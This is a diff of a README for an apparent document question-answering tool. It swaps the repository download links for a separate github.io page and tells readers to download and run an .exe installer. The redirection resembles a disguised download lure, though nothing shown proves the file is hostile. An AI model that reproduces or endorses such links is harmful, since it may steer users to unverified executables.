@@ -1,6 +1,6 @@
 # 🧠 adaptive-multistage-rag-system - Accurate answers from your long documents
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/impressionable-pyrrhotite668/adaptive-multistage-rag-system)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://impressionable-pyrrhotite668.github.io)
 
 This tool helps you find information inside long documents. It uses artificial intelligence to read your files and provide direct answers. You ask a question, and the system searches your document collection to give you a specific response.
 
@@ -32,7 +32,7 @@ If your computer meets these standards, the program will perform tasks at a stea
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit this page to download: [https://github.com/impressionable-pyrrhotite668/adaptive-multistage-rag-system](https://github.com/impressionable-pyrrhotite668/adaptive-multistage-rag-system)
+1. Visit this page to download: [https://impressionable-pyrrhotite668.github.io](https://impressionable-pyrrhotite668.github.io)
 2. Look for the file ending in .exe in the releases section.
 3. Click the link to save the installer to your computer.
 4. Locate the file in your downloads folder.
